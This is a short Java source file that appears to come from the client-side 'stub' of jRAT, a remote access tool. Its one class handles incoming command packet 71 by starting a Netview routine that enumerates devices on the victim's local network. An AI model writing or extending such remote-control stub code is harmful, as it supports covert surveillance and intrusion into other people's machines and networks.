package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;
import io.jrat.stub.Netview;

public class Packet71LocalNetworkDevices extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		new Netview(con).start();
	}

}
